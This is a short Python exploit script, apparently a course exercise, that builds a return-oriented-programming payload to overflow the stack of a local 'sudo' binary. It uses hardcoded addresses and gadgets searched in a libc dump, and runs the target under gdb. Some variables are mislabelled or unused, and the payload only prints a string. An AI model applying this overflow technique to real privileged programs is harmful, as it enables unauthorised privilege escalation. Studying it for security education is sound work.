import os, sys
import struct
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
	return 'Take me (%s) to your leader!' % student_id


def get_arg():
    import search
    gs = search.GadgetSearch('libc.bin',0xb7c39750)
    loop_add = 0xbfffe144
    puts_address = 0x8048580
    pop_ebx = gs.find('POP EBP').decode("hex")[::-1]
    pop_esp = gs.find('POP ESP').decode("hex")[::-1]
    skip_stack = gs.find('POP EDX').decode("hex")[::-1]
    my_str = 'Hello'
    return 'a'*66 + pop_ebx + struct.pack('<I',puts_address) + struct.pack('<I',puts_address) + skip_stack + my_str


def main(argv):
    #os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())
    os.execl('/usr/bin/gdb', '/usr/bin/gdb', '-ex=r', '--args', './sudo', get_arg())


if __name__ == '__main__':
    main(sys.argv)
